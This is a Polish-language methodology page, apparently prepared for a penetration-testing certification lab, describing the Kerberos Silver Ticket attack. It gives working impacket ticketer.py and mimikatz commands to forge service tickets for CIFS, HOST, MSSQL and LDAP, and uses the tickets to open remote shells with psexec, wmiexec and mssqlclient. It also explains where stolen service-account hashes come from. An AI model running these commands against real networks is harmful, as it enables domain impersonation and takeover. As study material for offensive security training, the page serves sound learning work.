---
layout: ad_vector
title: Silver Ticket
slug: silver-ticket
category: kerberos
order: 4
pre_reqs:
  - NT_hash_or_AES_key_of_service_account
  - domain_SID
  - target_SPN_and_host
tools: [impacket, mimikatz]
chain_inputs: [NT_HASH, AES_KEY, DOMAIN_FQDN, DOMAIN_SID, TARGET_HOST, TARGET_USER]
chain_outputs: [target_shell]
progress_total: 6
---

## mechanism

Silver Ticket = **sfałszowany TGS** dla konkretnej usługi. Szyfrujemy TGS **hashem konta usługi** (np. `MSSQLSvc$`, komputerowe konto `HOST/...`). KDC NIC nie wie — bilet jest ważny bo target service go rozszyfrowuje własnym kluczem i ufa PAC.

W przeciwieństwie do Golden Ticket:

- działa TYLKO na konkretną usługę (SPN), nie na cały DC
- nie wymaga `krbtgt` hasha — wystarczy hash konta usługi lub konta komputera targetu
- **nie wystawia AS-REQ ani TGS-REQ** na DC — tylko service używa TGS lokalnie, więc idealnie ciche (brak 4768/4769 z DC)
- PAC validation domyślnie wyłączona w większości services → bilet może kłamać o SID/grupach

**Uwaga:** od Windows Server 2019+ z odpowiednim patchowaniem (`PAC signature checking`) niektóre usługi (LSASS) walidują podpis PAC z krbtgt — wtedy Silver bez krbtgt hasha jest odrzucany. Standard w CPTS lab jest przed patchem.

## rekonesans — potrzebne dane

- **SID domeny:** `Get-DomainSID` (PowerView) / `lookupsid.py $DOMAIN/$USER:$PASS@$DC_IP` (impacket) / `whoami /user` na dowolnym joined hoscie
- **RID docelowego usera do podszycia:** typowo `500` (Administrator) — SID = `$DOMAIN_SID-500`
- **Hash konta usługi:** z DCSync (`secretsdump -just-dc`), z crackingu Kerberoast, z LSA dumpu na hoscie usługi

## impacket — ticketer.py

<details>
<summary>[+] wyjaśnienie flag</summary>

- `-nthash $NT_HASH` → NT hash konta usługi lub konta komputera targetu (dla CIFS/HOST na `SRV01` = hash `SRV01$`)
- `-aesKey $AES_KEY` → alternatywa dla NT (jeśli konto AES-only)
- `-domain-sid $DOMAIN_SID` → SID domeny (bez `-RID`)
- `-domain $DOMAIN_FQDN` → FQDN
- `-spn cifs/$TARGET_HOST.$DOMAIN_FQDN` → SPN do którego bilet będzie ważny
- `$TARGET_USER` (positional na końcu) → username który będzie w PAC (podszywamy się pod `administrator` żeby dostać DA-level access do usługi)
- `-user-id 500` → RID (default 500 = Administrator)
- `-groups 512,513,518,519,520` → RIDs grup w PAC (DA=512, Domain Users=513, Schema=518, Enterprise=519, Group Policy=520)
- Output: `.ccache` w pwd, plus zmienna env `KRB5CCNAME`

</details>

{% include cmd.html env="kali" cmd="ticketer.py -nthash $NT_HASH -domain-sid $DOMAIN_SID -domain $DOMAIN_FQDN -spn cifs/$TARGET_HOST.$DOMAIN_FQDN $TARGET_USER" note="CIFS = dostęp do SMB shares na TARGET_HOST" %}

{% include cmd.html env="kali" cmd="ticketer.py -nthash $NT_HASH -domain-sid $DOMAIN_SID -domain $DOMAIN_FQDN -spn host/$TARGET_HOST.$DOMAIN_FQDN $TARGET_USER" note="HOST = zdalny WMI/schtasks (psexec działa też z HOST/)" %}

{% include cmd.html env="kali" cmd="ticketer.py -nthash $NT_HASH -domain-sid $DOMAIN_SID -domain $DOMAIN_FQDN -spn MSSQLSvc/$TARGET_HOST.$DOMAIN_FQDN:1433 $TARGET_USER" note="MSSQL — dostęp jako 'administrator' do SQL Server" %}

{% include cmd.html env="kali" cmd="ticketer.py -aesKey $AES_KEY -domain-sid $DOMAIN_SID -domain $DOMAIN_FQDN -spn ldap/$TARGET_HOST.$DOMAIN_FQDN $TARGET_USER" note="LDAP silver (rzadko exploitowane, DCSync przez ldap replikacja)" %}

## użycie biletu (impacket)

{% include cmd.html env="kali" cmd="export KRB5CCNAME=$(pwd)/$TARGET_USER.ccache" %}

{% include cmd.html env="kali" cmd="klist" note="sanity: powinien pokazać sfałszowany TGS" %}

{% include cmd.html env="kali" cmd="smbclient.py -k -no-pass $TARGET_USER@$TARGET_HOST.$DOMAIN_FQDN" note="CIFS silver → SMB shares" %}

{% include cmd.html env="kali" cmd="psexec.py -k -no-pass $TARGET_USER@$TARGET_HOST.$DOMAIN_FQDN" note="wymaga HOST/ i CIFS/ silver (psexec używa obu SPN)" %}

{% include cmd.html env="kali" cmd="wmiexec.py -k -no-pass $TARGET_USER@$TARGET_HOST.$DOMAIN_FQDN" note="tylko HOST/ silver wystarczy" %}

{% include cmd.html env="kali" cmd="mssqlclient.py -k -no-pass $TARGET_USER@$TARGET_HOST.$DOMAIN_FQDN" note="MSSQL silver — potem `xp_cmdshell` jeśli sysadmin" %}

## mimikatz (Windows session)

{% include cmd.html env="windows" cmd="kerberos::purge" note="wyczyść stare bilety" %}

{% include cmd.html env="windows" cmd="kerberos::golden /domain:$DOMAIN_FQDN /sid:$DOMAIN_SID /target:$TARGET_HOST.$DOMAIN_FQDN /service:cifs /rc4:$NT_HASH /user:$TARGET_USER /ptt" note="/target = server, /service = SPN class, /ptt = pass-the-ticket od razu" %}

{% include cmd.html env="windows" cmd="dir \\\\$TARGET_HOST.$DOMAIN_FQDN\\c$" note="test bilet działa" %}

## checklist

- [ ] mam `$DOMAIN_SID` (`Get-DomainSID` / `lookupsid.py`)
- [ ] mam hash konta usługi (z DCSync / kerberoast crack / LSA dump)
- [ ] wygenerowałem `.ccache` (ticketer.py) lub wstrzyknąłem przez mimikatz /ptt
- [ ] `export KRB5CCNAME=...` + `klist` pokazuje bilet
- [ ] `smbclient.py -k -no-pass` / `wmiexec.py -k -no-pass` łączy się
- [ ] zapisałem shell i sukcesywny wektor do kontekstu (`$TARGET_HOST` = new pivot)

## troubleshoot

- **KRB_AP_ERR_MODIFIED** → hash konta usługi jest zły, albo target jest AES-only a Ty próbujesz RC4. Zdobądź `$AES_KEY` (DCSync `-just-dc`) i użyj `-aesKey`.
- **Server not found in Kerberos database** → SPN w bilecie NIE PASUJE do targetu. `TARGET_HOST` musi być tym samym FQDN co w SPN — sprawdź `setspn -L` konta.
- **PAC validation failed** → post-2019 patch. Ten wektor jest zablokowany, wróć do Golden Ticket (z krbtgt) lub DCSync-based approach.

## follow-up

- **Golden Ticket** — jeśli masz krbtgt hash → `/AD_metodology/golden-ticket/`
- **DCSync** — z admin session → `/AD_metodology/dcsync/`
- **DCShadow** — beyond-CPTS, ale eleganckie post-DA
